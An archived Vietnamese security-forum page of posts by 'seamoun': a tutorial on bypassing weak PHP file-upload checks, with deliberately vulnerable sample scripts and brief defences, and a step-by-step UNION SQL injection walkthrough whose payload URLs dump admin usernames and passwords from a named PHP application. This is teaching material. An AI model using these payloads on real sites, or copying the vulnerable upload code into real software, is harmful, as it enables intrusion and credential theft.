<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by seamoun, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by seamoun - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/332.html" name="top" class="maintitle" id="top">Messages posted by: seamoun</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/332.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/332.html">Profile for seamoun</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/332.html">Messages posted by seamoun</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">22</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25298.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25298/153245.html#153245,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">rickb wrote:</cite><br>
<blockquote>@seamoun : Hình như anh chưa upload các demo phải ko nhỉ <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"><br/><br/> Thân,&nbsp;
</blockquote><br/><br/> Các demo cho từng phần seamoun đã attach rồi mà. Login vào thấy file OK mà.<br/><br/> <p></p>
<cite class="blockquote">mrro wrote:</cite><br>
<blockquote>Hay lém anh seamoun. Có một hướng khai thác liên quan đến tính năng upload file trong web-application (không riêng gì PHP) mới được công bố ở hội thảo BlackHat 2008 vừa rồi là GIFAR. Tóm tắt là kết hợp file GIF với file JAR lại để vượt qua same-origin policy của trình duyệt.<br/><br/> Xem thêm<span class="link"> http://heasman.blogspot.com/2008/08/on-gifars.html</span> và<span class="link"> http://www.gnucitizen.org/blog/more-on-gifars-and-other-dangerous-attacks/</span><br/><br/> Bà con thử bình luận về cái GIFAR này xem.&nbsp;
</blockquote><br/><br/> Anh cũng đang đọc bài viết trong link em gửi. Thanks<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25298.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25298/153178.html#153178,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">4) Trường hợp kiểm tra phần mở rộng của file trên server với đoạn mã sau:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?php
$blacklist = array&#40;".php", ".phtml"&#41;;
foreach &#40;$blacklist as $item&#41; {
if&#40;preg_match&#40;"/$item\$/i", $_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;&#41; {
echo "We do not allow uploading PHP files\n";
exit;
}
}
$uploaddir = 'uploads/';
$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
echo "File is valid, and was successfully uploaded.\n";
} else {
echo "File uploading failed.\n";
}
?&gt;</pre>
</div><br/><br/> Như vậy với đoạn mã người lập trình đã ngăn chặn kẻ tấn công không thể upload file *.php lên server. Tuy nhiên trường hợp này cũng chưa an toàn với những server mà có cấu hình file *.gif, *.jpg cho phép xử lý PHP. Do vậy kẻ tấn công vẫn upload file gif, jpg lên server nhưng có chèn thêm mã độc vào.<br/> <font color='orange'><b><br/> III. CÁCH PHÒNG CHỐNG</b></font><br/> Mấu chốt giải quyết vấn để làm thế nào an toàn trong file upload đó là lưu giữ file upload lên một nơi mà không thể truy cập bởi user thông qua URL. Điều này có thể thực hiện được bằng cách lưu file upload bên ngoài thưc mục webroot hoặc trên web server nhưng từ chối truy cập đến thư mục đó.<br/><br/> Tài liệu tham khảo: Secure File Upload In PHP Web Applications - ScanIt<br/> Công cụ sử dụng: Burp Suite <span class="link"> http://portswigger.net/</span>)</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25298.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25298/153177.html#153177,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">3) Trường hợp kiểm tra mime - kiểm tra phần nội dung của file upload với đoạn mã sau:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?php
$imageinfo = getimagesize&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;&#41;;
if&#40;$imageinfo&#91;'mime'&#93; != 'image/gif' && $imageinfo&#91;'mime'&#93; != 'image/jpeg'&#41; {
echo "Sorry, we only accept GIF and JPEG images\n";
exit;
}
$uploaddir = 'uploads/';
$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
echo "File is valid, and was successfully uploaded.\n";
} else {
echo "File uploading failed.\n";
}
?&gt;</pre>
</div><br/><br/> Như vậy liệu có cải thiện hơn ? An toàn hơn ? Trả lời: có cái thiện hơn nhưng vẫn chưa an toàn. Mặc dù với đoạn mã trên kẻ tấn công không thực hiện thành công như ở Lab2, khi thay đổi type=image/gif vì lúc này người lập trình đã kiểm tra nội dung file upload có đúng là gif hay không ?. Nhưng nếu kẻ tấn công sử dụng một file gif và chèn mã độc vào thì thế nào ? Khai thác sẽ thành công !!!!<br/><br/> Sau đây là demo thứ 3 khai thác lỗi file upload trong PHP WebApp</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25298.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25298/153175.html#153175,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">2) Trường hợp không sử dụng JavaScript để kiểm tra mà thực hiện kiểm tra trên server với đoạn mã sau:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?php
if&#40;$_FILES&#91;'userfile'&#93;&#91;'type'&#93; != "image/gif"&#41; {
echo "Sorry, we only allow uploading GIF images";
exit;
}
$uploaddir = 'uploads/';
$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
echo "File is valid, and was successfully uploaded.\n";
} else {
echo "File uploading failed.\n";
}
?&gt;</pre>
</div><br/> Với đoạn mã trên người lập trình hy vọng ngăn chặn được kẻ tấn công upload file độc hại lên server bằng cách sử dụng kiểm tra type=image/gif. Tức là kiểu file cho phép upload ở đây chỉ có thể là file gif. Điều này cũng không an toàn bởi vì kẻ tấn công có thể thay đổi kiểu type=image/gif cho phù hợp với sự kiểm tra của đoạn mã trên nhưng nội dung vẫn chứa mã độc.<br/> Sau đây là demo thứ 2 khai thác lỗi file upload trong PHP WebApp</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25298.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25298/153174.html#153174,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><font color='orange'><b>I. GIỚI THIỆU</b></font><br/> Ứng dụng Web hỗ trợ cho phép người sử dụng thực hiện upload file lên server hiện tại có rất nhiều. Ví dụ như upload image(*.gif, *.jpg), *.pdf, *.doc, ...<br/> Trong bài này seamoun sẽ trình bày một số lỗi khi lập trình file upload mà kẻ xấu có thể lợi dụng để upload những mã độc lên server. Những phương thức khai thác mà seamoun trình bày chỉ mang tính tham khảo không ủng hộ các bạn khai thác đối với những server bị mắc lỗi.<br/><br/> <font color='orange'><b>II. KHAI THÁC LỖI UPLOAD FILE</b></font><br/> 1) Trường hợp sử dụng JavaScript để kiểm tra file upload<br/> Giả sử ta có kịch bản gồm 2 file như sau:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;html&gt;
&lt;title&gt;Secure file upload PHP Web Applications&lt;/title&gt;
&lt;head&gt;
&lt;script language=javascript&gt;
function chkFileExtension&#40;&#41;
{
var str=document.upload.userfile.value;
var ext=str.substring&#40;str.length,str.length-3&#41;;
if &#40; ext != "gif"&#41;
{
alert&#40;"File is invalid"&#41;;
return false;
}
else
{
return true;
};
}
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form name="upload" action="upload1.php" method="POST" ENCTYPE="multipart/form-data" onSubmit="return chkFileExtension&#40;&#41;"&gt;
Select the file to upload: &lt;input type="file" name="userfile"&gt;
&lt;input type="submit" name="upload" value="upload"&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div><br/><br/><br/><br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?php
$uploaddir = 'uploads/';
$uploadfile = $uploaddir . basename&#40;$_FILES&#91;'userfile'&#93;&#91;'name'&#93;&#41;;
if &#40;move_uploaded_file&#40;$_FILES&#91;'userfile'&#93;&#91;'tmp_name'&#93;, $uploadfile&#41;&#41; {
echo "File was successfully uploaded.\n";
} else {
echo "File uploading failed.\n";
}
?&gt;</pre>
</div><br/><br/> Ví dụ trên cho thấy người lập trình kiểm tra phần mở rộng file cho phép file upload bằng cách sử dụng một đoạn mã Javascript trong file upload1.html. Chỉ chấp nhận những file có phần mở rộng là *.gif thì mới được phép upload, cách này một kẻ tấn công dễ dàng vượt qua bằng cách sử dụng một intercepting proxy hoặc có thể viết một đoạn mã bằng Perl, Python,... mà đệ trình trực tiếp đến file upload1.php với những tham số cần thiết.<br/><br/> Trong demo sau seamoun sử dụng Burp Suite là một tool rất mạnh khi thực hiện Web Application. Có thể download tại :<span class="link"> http://portswigger.net/</span></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/25210.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/25210/152645.html#152645,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><font color='orange'><b>I. Hướng dẫn cơ bản khai thác SQL Injection đối với MySQL</b></font><br/> Demo: Khai thác SQL Injection trong Basic PHP Events Lister 1.0<br/><br/> Đầu tiên với URL:<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span><br/> Thực hiện thêm dấu ' sau id=1. URL trở thành<span class="link"> http://seamoun.com/phpevents/event.php?id=1'</span><br/> Ta phát hiện rằng phpvents có lỗi SQL Injection với thông báo sau:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>Warning: mysql_numrows&#40;&#41;: supplied argument is not a valid MySQL result resource in C:\xampp\htdocs\phpevents\event.php on line 37</pre>
</div><br/><br/> Đối tượng khai thác SQL Injection ở đây là "Basic PHP Events Lister 1.0". Giả sử chúng ta không biết trường và bảng của ứng dụng web này là gì?<br/> Với lỗi SQL Injection gây ra bởi URL trên ta xem thử truy vấn (SQL) của nó liệu có bao nhiều trường. Sở dĩ cần xác định điều này<br/> bởi vì khi chúng ta dùng UNION trong câu lệnh SQL thì số lượng trường của hai câu lệnh select phải trùng nhau.<br/> (Các bạn không rõ vấn đề này thì xem ý nghĩa câu lệnh SQL. Ở đây mình không giải thích vì hiển nhiên phải hiểu rõ SQL mới khai thá được).<br/> Xác định có bao nhiêu trường truy vấn với URL<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> có rất nhiều cách để thực hiện. Ở đây mình sử dụng order by &lt;num&gt;. Thực hiện tăng dần &lt;num&gt;. Khi thực hiện order by &lt;num&gt;, nếu trang web không hiển thị lỗi tức là số lượng trường vẫn còn, thực hiện tăng &lt;num&gt; cho đến khi nào xuất hiện lỗi tức là ta đã thực hiện tìm đủ số lượng trường.<br/><br/> Lần lượt mình thử:<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>http://seamoun.com/phpevents/event.php?id=1 order by 1<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> order by 2<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> order by 3
...
<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> order by 15 &#40;&lt;-- Vẫn OK&#41;<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> order by 16 &#40;Xuất hiện lỗi&#41;</pre>
</div><br/><br/> Như vậy truy vấn SQL với URL trên là 15 trường (field)<br/> Đến đây có thể điều tra phiên bản SQL, user với lệnh sau<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>http://seamoun.com/phpevents/event.php?id=1 union all select 1,@@version,1,1,1,1,1,1,1,1,1,1,1,1,1
<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,user&#40;&#41;,1,1,1,1,1,1,1,1,1,1,1,1,1</pre>
</div><br/><br/><br/> Sau khi đã có số lượng trường rồi thì lúc này sẽ tiến hành đoán bảng (table) login của nó: có thể thử với các table thông dụng như<br/> manager, admin, administrator, systemlogin, ... (Việc đoán table thuộc về kinh nghiệm, kết hợp với việc crawl, spider nội dung web mà mình khai thác). Nếu như tên bảng không đúng thì khi thực hiện union all select ... nó sẽ thông báo lỗi, ngược lại nếu tên đúng thì nó chạy OK. Tiến hành thử tìm table như sau:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>http://seamoun.com/phpevents/event.php?id=1 union all select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from systemlogin &#40;Fail&#41;<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from manager &#40;Fail&#41;<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from admin &#40;OK&#41;</pre>
</div><br/><br/> Sau khi đoán được tên table là admin. Tiếp theo là dự đoán tên trường trong bảng admin mà mình đã lấy được.<br/> Có thể đoán tên trường trong bảng admin như là username,uname,user, ... pass, passwd, password, pword, .... (Tương tự như trên cũng tùy thuộc vào kinh nghiệm kết hợp với việc crawl, spider nội dung web để tìm tên trường). Tiền hành thử như sau<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>http://seamoun.com/phpevents/event.php?id=1 union all select 1,username,1,1,1,1,1,1,1,1,1,1,1,1,1 from admin &#40;Fail&#41;<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,user,1,1,1,1,1,1,1,1,1,1,1,1,1 from admin &#40;Fail&#41;<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,uname,1,1,1,1,1,1,1,1,1,1,1,1,1 from admin &#40;OK&#41;
Như vậy trường thứ nhất ta đoán được là uname trong bảng admin. Thực hiện đoán trường mật khẩu
<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,password,1,1,1,1,1,1,1,1,1,1,1,1,1 from admin &#40;Fail&#41;<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,passwd,1,1,1,1,1,1,1,1,1,1,1,1,1 from admin &#40;Fail&#41;<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,pword,1,1,1,1,1,1,1,1,1,1,1,1,1 from admin &#40;OK&#41;</pre>
</div><br/><br/> Như vậy ta đoán được trường mật khẩu là pword. Như vậy ta đã có thông tin đầy đủ để lấy user và pass trong bảng admin với<br/> 2 trường uname và pword + tên bảng là admin<br/> Thực hiện lệnh:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>http://seamoun.com/phpevents/event.php?id=1 union all select 1,concat&#40;uname,0x3a,pword&#41;,1,1,1,1,1,1,1,1,1,1,1,1,1 from admin.</pre>
</div><br/><br/> Thực chất với hai câu lệnh trên thì ta tìm được user và pass nhưng muốn thực hiện lệnh<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,concat(uname,0x3a,pword),1,1,1,1,1,1,1,1,1,1,1,1,1 from admin. Để có được tất cả user và pass trong bảng admin. Nếu trường hợp này xuất hiện lỗi ta có thể thêm limit 0,1 và tăng dần limit 1,1 limit 2,1 để lấy hết tất cả user và pass<br/><br/> Sở dĩ thực hiện câu lệnh trên để đồng thời lấy uname và pword không cần phải thực hiện 2 lần mới có được uname và pword.<br/> 0x3a---&gt; dấu ":". Concat sẽ thực hiện cộng chuỗi<br/><br/> Đến đây ta đã có thông tin uname và pword.<br/> Nếu trường hợp mà kết nối đến MySQL sử dụng user root thì việc tìm bảng và trường dễ dàng hơn với lệnh sau<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>Điều tra thông tin bảng:
<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,1,table_name,1,1,1,1,1,1,1,1,1,1,1,1 from information_schema.tables
Điều tra thông tin trường:
<span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,1,column_name,1,1,1,1,1,1,1,1,1,1,1,1 from information_schema.columns</pre>
</div><br/><br/> Ngoài ra trong một số trường hợp xuất hiện lỗi khi thực hiện khai thác có thể sử dụng hàm convert, hex, ... để không bị lỗi khi khai thác như:<br/><span class="link"> http://seamoun.com/phpevents/event.php?id=1</span> union all select 1,1,unhex(hex(uname)),1,1,1,1,1,1,1,1,1,1,1,1 from admin<br/><br/> <b><font color='orange'>II. Demo: Khai thác SQL Injection trong Basic PHP Events Lister 1.0 (milw0rm.com)</font></b><br/> Đây chỉ là hướng dẫn cơ bản nhất về khai thác SQL - Injection đối với MySQL. Các bạn demo thì install trên máy mình để kiểm tra, đừng đi hack người khác à nha.<br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/12.html">Thảo luận thâm nhập</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/18923.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/18923/147403.html#147403,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">mr_hoang09 wrote:</cite><br>
<blockquote>dear chú seamoun!<br/> Đầu tiên cháu cảm ơn vì chú có 1 bài viết khá hay, rất bổ ích cho cháu.<br/> Chú à, cháu năm nay là sinh viên năm 3(ngành công nghệ thông tin,mai mốt mới đi học), những gì cháu biết thì nhiều và linh tinh lắm, ko hệ thống gì hết. Cháu nghe giang hồ dồn chú ở Đà Nằng mà cháu cũng đang ở đó. Giờ cháu muốn chú cho cháu biết phương tiện liên lạc gì với chú để cháu có thể thỉnh giáo những lúc gặp khó khăn(mail, nick yahoo, điện thoại, số nhà...)<br/> Cháu cũng đã cấu hình đc một server trên Linux nhưng cấu hình xong, Scan chỉ biết đang chạy những dịch vụ gì rồi đứng đó ngó thôi chứ ko biết làm gì nữa hết.<br/> Nick yahoo cháu nè:ku_shm.<br/> số điện:.......ko dám ghi lên sợ bị nháy máy.&nbsp;
